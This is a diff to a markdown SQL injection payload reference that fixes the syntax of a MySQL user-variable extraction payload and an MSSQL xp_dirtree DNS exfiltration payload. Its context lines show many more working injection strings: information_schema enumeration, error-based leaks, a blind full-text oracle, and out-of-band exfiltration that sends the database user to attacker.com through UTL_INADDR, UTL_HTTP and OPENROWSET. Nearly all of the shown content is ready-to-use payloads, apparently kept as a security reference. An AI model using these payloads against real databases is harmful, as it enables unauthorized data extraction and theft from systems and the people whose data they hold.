@@ -163,7 +163,7 @@ Mutations leveraging **proprietary functions, syntax, and system objects** uniqu
 | **information_schema Enumeration** | Metadata table querying | `' UNION SELECT table_name,2 FROM information_schema.tables--` |
 | **GROUP BY / HAVING Error Leak** | Column name disclosure via aggregation errors | `' GROUP BY columnname HAVING 1=1--` |
 | **PROCEDURE ANALYSE** | Data type information leakage | `' PROCEDURE ANALYSE()--` |
-| **@Variable Exploitation** | Multi-step extraction via user variables | `' AND(@a:=CONCAT_WS(':',table_name) FROM information_schema.tables)--` |
+| **@Variable Exploitation** | Multi-step extraction via user variables | `' AND (SELECT @a:=GROUP_CONCAT(table_name SEPARATOR ':') FROM information_schema.tables)--` |
 | **Full-Text Search Blind Oracle** | Abusing `MATCH ... AGAINST` in boolean mode: MySQL's full-text boolean parser interprets operators (`+`, `-`, `*`, `~`) that interact with application-level redirect or error behavior, creating blind inference oracles from endpoints that don't return query results directly | `' AND MATCH(col) AGAINST('+target*' IN BOOLEAN MODE)--` |
 
 ### §3-2. PostgreSQL-Specific Techniques
@@ -332,7 +332,7 @@ Transmitting data to an external server via DNS lookups, HTTP requests, or other
 
 | Subtype | Mechanism | Payload Example |
 |---------|-----------|-----------------|
-| **DNS Exfiltration (MSSQL)** | DNS lookup via UNC path | `'; EXEC xp_dirtree '\\'+user()+'.attacker.com\a'--` |
+| **DNS Exfiltration (MSSQL)** | DNS lookup via UNC path | `'; EXEC xp_dirtree '\\'+SYSTEM_USER+'.attacker.com\a'--` |
 | **DNS Exfiltration (Oracle)** | DNS lookup via UTL_INADDR | `' AND 1=UTL_INADDR.GET_HOST_ADDRESS((SELECT user FROM dual)||'.attacker.com')--` |
 | **HTTP Exfiltration (Oracle)** | External HTTP request via UTL_HTTP | `' AND 1=UTL_HTTP.REQUEST('http://attacker.com/'||(SELECT user FROM dual))--` |
 | **HTTP Exfiltration (MSSQL)** | External connection via OPENROWSET | `'; SELECT * FROM OPENROWSET('SQLOLEDB','attacker.com';'a';'a','SELECT 1')--` |
